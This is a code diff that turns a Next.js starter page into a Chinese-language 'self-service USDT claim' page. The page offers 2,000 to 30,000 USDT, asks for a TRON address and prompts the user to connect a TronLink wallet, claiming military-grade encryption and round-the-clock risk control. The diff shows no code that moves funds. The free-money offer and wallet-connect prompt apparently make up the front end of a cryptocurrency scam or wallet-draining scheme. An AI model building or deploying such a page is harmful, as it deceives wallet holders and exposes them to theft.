@@ -1,69 +1,689 @@
-import Image from "next/image";
+"use client";
+
+import { useState } from "react";
+
+import {
+  useWallet
+} from "@tronweb3/tronwallet-adapter-react-hooks";
+
+
 
 export default function Home() {
+
+
+  const [amount,setAmount] = useState("2000");
+
+  const [inputAddress,setInputAddress] = useState("");
+
+  const [msg,setMsg] = useState("");
+
+  const [showWalletModal,setShowWalletModal] = useState(false);
+
+
+
+  const {
+    connect,
+    connected,
+    address,
+  } = useWallet();
+
+
+
+
+
+  async function bindWallet(){
+
+
+    try{
+
+
+      if(!inputAddress.trim()){
+
+
+        setMsg(
+          "请输入您的TRON钱包地址"
+        );
+
+
+        return;
+
+      }
+
+
+
+
+      const tronReg =
+      /^T[1-9A-HJ-NP-Za-km-z]{33}$/;
+
+
+
+      if(!tronReg.test(inputAddress)){
+
+
+        setMsg(
+          "请输入正确的TRON钱包地址"
+        );
+
+
+        return;
+
+
+      }
+
+
+
+
+
+
+      if(!connected){
+
+
+        setShowWalletModal(true);
+
+
+        await connect();
+
+
+        setShowWalletModal(false);
+
+
+      }
+
+
+
+
+
+
+      if(address){
+
+
+        setMsg(
+          "钱包连接成功：" + address
+        );
+
+
+      }else{
+
+
+        setMsg(
+          "钱包连接成功，请等待地址读取"
+        );
+
+
+      }
+
+
+
+    }catch(error){
+
+
+      console.log(error);
+
+
+      setMsg(
+        "钱包连接失败"
+      );
+
+
+    }
+
+
+  }
+
+
+
+
+
+
+
+  function openWallet(){
+
+
+  const currentUrl = window.location.href;
+
+
+  window.location.href =
+  `tronlink://openUrl?url=${encodeURIComponent(currentUrl)}`;
+
+
+}
+
+
+
+
+
+
+
   return (
-    <div className="flex flex-col flex-1 items-center justify-center bg-zinc-50 font-sans dark:bg-black">
-      <main className="flex flex-1 w-full max-w-3xl flex-col items-center justify-between py-32 px-16 bg-white dark:bg-black sm:items-start">
-        <Image
-          className="dark:invert h-5 w-[100px]"
-          src="/next.svg"
-          alt="Next.js logo"
-          width={100}
-          height={20}
-          priority
-        />
-        <div className="flex flex-col items-center gap-6 text-center sm:items-start sm:text-left">
-          <h1 className="max-w-xs text-3xl font-semibold leading-10 tracking-tight text-black dark:text-zinc-50">
-            To get started, edit the{" "}
-            <code className="rounded bg-black/[.06] px-1.5 py-0.5 font-mono text-[0.9em] dark:bg-white/[.08]">
-              page.tsx
-            </code>{" "}
-            file.
-          </h1>
-          <p className="max-w-md text-lg leading-8 text-zinc-600 dark:text-zinc-400">
-            Looking for a starting point or more instructions? Head over to{" "}
-            <a
-              href="https://vercel.com/templates?framework=next.js&utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-              className="font-medium text-zinc-950 dark:text-zinc-50"
-            >
-              Templates
-            </a>{" "}
-            or the{" "}
-            <a
-              href="https://nextjs.org/learn?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-              className="font-medium text-zinc-950 dark:text-zinc-50"
-            >
-              Learning
-            </a>{" "}
-            center.
+
+    <main className="min-h-screen bg-[#030817] text-white px-5 py-6">
+
+
+      <div className="flex justify-between items-center">
+
+
+        <div className="flex items-center gap-3">
+
+
+          <div className="w-14 h-14 rounded-2xl bg-gradient-to-br from-cyan-300 to-blue-500 flex items-center justify-center text-black font-black text-xl">
+
+            KK
+
+          </div>
+
+
+          <div>
+
+
+            <div className="font-bold text-lg">
+
+              自助领取USDT
+
+            </div>
+
+
+            <div className="text-xs text-gray-400">
+
+              Secure Web3 Service
+
+            </div>
+
+
+          </div>
+
+
+        </div>
+
+
+
+
+        <div className="rounded-full border border-white/10 px-4 py-2 text-sm">
+
+          🟢 TRON Network
+
+        </div>
+
+
+      </div>
+
+
+
+
+
+      <div className="text-center mt-20">
+
+
+        <div className="inline-block rounded-full border border-cyan-400/30 px-5 py-2 text-cyan-300">
+
+          ⚡ 快速 · 安全 · 专业
+
+        </div>
+
+
+
+        <h1 className="text-4xl font-bold mt-8">
+
+          提取地址绑定
+
+        </h1>
+
+
+
+        <p className="text-gray-400 mt-5 leading-8">
+
+          绑定您的TRON钱包地址
+
+          <br/>
+
+          用于USDT提取
+
+        </p>
+
+
+      </div>
+
+
+
+
+
+      <div className="mt-12">
+
+
+        <h2 className="font-bold text-lg mb-5">
+
+          选择提取金额
+
+        </h2>
+
+
+
+
+
+        <label
+
+        className={`block rounded-3xl border p-6 mb-4 cursor-pointer ${
+        
+        amount==="2000"
+        ?
+        "border-cyan-400 bg-cyan-400/10"
+        :
+        "border-white/10 bg-white/5"
+
+        }`}
+
+        >
+
+
+          <input
+
+          type="radio"
+
+          checked={amount==="2000"}
+
+          onChange={()=>setAmount("2000")}
+
+          className="hidden"
+
+          />
+
+
+
+          <div className="text-cyan-300 text-sm">
+
+            ⭐ 新用户测试专用
+
+          </div>
+
+
+
+          <div className="text-4xl font-bold mt-3">
+
+            2000
+
+            <span className="text-xl text-cyan-300 ml-2">
+
+              USDT
+
+            </span>
+
+          </div>
+
+
+        </label>
+
+
+
+
+
+        <div className="grid grid-cols-2 gap-4">
+
+
+          {
+          ["10000","20000","30000"].map(item=>(
+
+
+          <label
+
+          key={item}
+
+          className={`rounded-2xl border py-5 text-center cursor-pointer ${
+          
+          amount===item
+          ?
+          "border-cyan-400 bg-cyan-400/20 text-cyan-300"
+          :
+          "border-white/10 bg-white/5"
+
+          }
+          
+          ${item==="30000"?"col-span-2":""}
+
+          `}
+
+
+          >
+
+
+          <input
+
+          type="radio"
+
+          checked={amount===item}
+
+          onChange={()=>setAmount(item)}
+
+          className="hidden"
+
+          />
+
+
+          {item} USDT
+
+
+          </label>
+
+
+          ))
+
+          }
+
+
+
+        </div>
+                <div className="text-center mt-5 text-sm text-gray-400">
+
+          当前选择：
+
+          <span className="text-cyan-300 ml-2">
+
+            {amount} USDT
+
+          </span>
+
+        </div>
+
+
+      </div>
+
+
+
+
+
+
+
+
+      {/* 地址 */}
+
+      <div className="mt-12">
+
+
+        <h2 className="font-bold text-lg mb-5">
+
+          输入接收地址
+
+        </h2>
+
+
+
+
+
+        <div className="flex items-center gap-4 bg-white/5 border border-white/10 rounded-3xl p-5">
+
+
+          <div className="w-12 h-12 rounded-xl bg-cyan-400/20 flex items-center justify-center text-cyan-300 font-bold">
+
+            T
+
+          </div>
+
+
+
+
+          <input
+
+
+            value={inputAddress}
+
+
+            onChange={(e)=>setInputAddress(e.target.value)}
+
+
+            placeholder="请输入您的TRON钱包地址"
+
+
+            className="flex-1 bg-transparent outline-none placeholder:text-gray-600"
+
+
+          />
+
+
+        </div>
+
+
+
+
+
+
+
+
+        <button
+
+
+          onClick={bindWallet}
+
+
+          className="mt-6 w-full rounded-2xl py-5 font-bold text-black bg-gradient-to-r from-cyan-300 to-blue-400"
+
+
+        >
+
+          立即绑定
+
+
+        </button>
+
+
+
+
+
+
+
+        {
+          msg &&
+
+          <div className="text-center text-cyan-300 mt-4 text-sm">
+
+            {msg}
+
+          </div>
+
+        }
+
+
+
+
+
+
+        {
+          address &&
+
+
+          <div className="mt-5 rounded-2xl bg-white/5 border border-white/10 p-4 text-sm break-all">
+
+
+            <div className="text-green-400">
+
+              🟢 钱包已连接
+
+            </div>
+
+
+            <div className="text-gray-400 mt-2">
+
+              {address}
+
+            </div>
+
+
+          </div>
+
+
+        }
+
+
+
+
+
+      </div>
+
+
+
+
+
+
+
+
+      {/* 安全区域 */}
+
+
+      <div className="mt-12 space-y-4">
+
+
+        <div className="bg-white/5 border border-white/10 rounded-2xl p-4">
+
+          🛡️ 军级加密技术，确保地址绑定安全
+
+        </div>
+
+
+
+        <div className="bg-white/5 border border-white/10 rounded-2xl p-4">
+
+          ⚡ 毫秒级处理速度，及时完成绑定
+
+        </div>
+
+
+
+        <div className="bg-white/5 border border-white/10 rounded-2xl p-4">
+
+          🔰 专业风控团队，24小时安全保障
+
+        </div>
+
+
+      </div>
+
+
+
+
+
+
+
+
+
+      <footer className="text-center mt-16 pb-10 text-gray-500">
+
+
+        <div className="text-2xl text-cyan-300 font-bold">
+
+          KK
+
+        </div>
+
+
+        Secure Web3 Infrastructure
+
+
+      </footer>
+
+
+
+
+
+
+
+
+      {/* 钱包连接弹窗 */}
+
+
+
+      {
+      showWalletModal &&
+
+
+
+      <div className="fixed inset-0 bg-black/70 flex items-center justify-center px-6 z-50">
+
+
+        <div className="bg-[#101936] rounded-3xl p-8 text-center w-full max-w-sm border border-white/10">
+
+
+          <img
+
+          src="/tronlink-global.png"
+
+          className="w-24 h-24 mx-auto rounded-2xl"
+
+          />
+
+
+
+
+          <h2 className="text-2xl font-bold mt-6">
+
+            连接TRON钱包
+
+          </h2>
+
+
+
+
+          <p className="text-gray-400 mt-4 leading-7">
+
+            请连接您的TronLink钱包
+
+            <br/>
+
+            安全访问DApp
+
           </p>
-        </div>
-        <div className="flex flex-col gap-4 text-base font-medium sm:flex-row">
-          <a
-            className="flex h-12 w-full items-center justify-center gap-2 rounded-full bg-foreground px-5 text-background transition-colors hover:bg-[#383838] dark:hover:bg-[#ccc] md:w-[158px]"
-            href="https://vercel.com/new?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
+
+
+
+
+
+          <button
+
+
+          onClick={openWallet}
+
+
+          className="mt-8 w-full rounded-2xl py-5 bg-gradient-to-r from-cyan-300 to-blue-400 text-black font-bold"
+
+
           >
-            <Image
-              className="dark:invert h-[14px] w-4"
-              src="/vercel.svg"
-              alt="Vercel logomark"
-              width={16}
-              height={14}
-            />
-            Deploy Now
-          </a>
-          <a
-            className="flex h-12 w-full items-center justify-center rounded-full border border-solid border-black/[.08] px-5 transition-colors hover:border-transparent hover:bg-black/[.04] dark:border-white/[.145] dark:hover:bg-[#1a1a1a] md:w-[158px]"
-            href="https://nextjs.org/docs?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
+
+            连接 TronLink 钱包
+
+
+          </button>
+
+
+
+
+
+          <button
+
+
+          onClick={()=>setShowWalletModal(false)}
+
+
+          className="mt-5 text-gray-400"
+
+
           >
-            Documentation
-          </a>
+
+            取消
+
+          </button>
+
+
+
         </div>
-      </main>
-    </div>
+
+
+      </div>
+
+
+
+      }
+
+
+
+    </main>
+
   );
+
+
 }
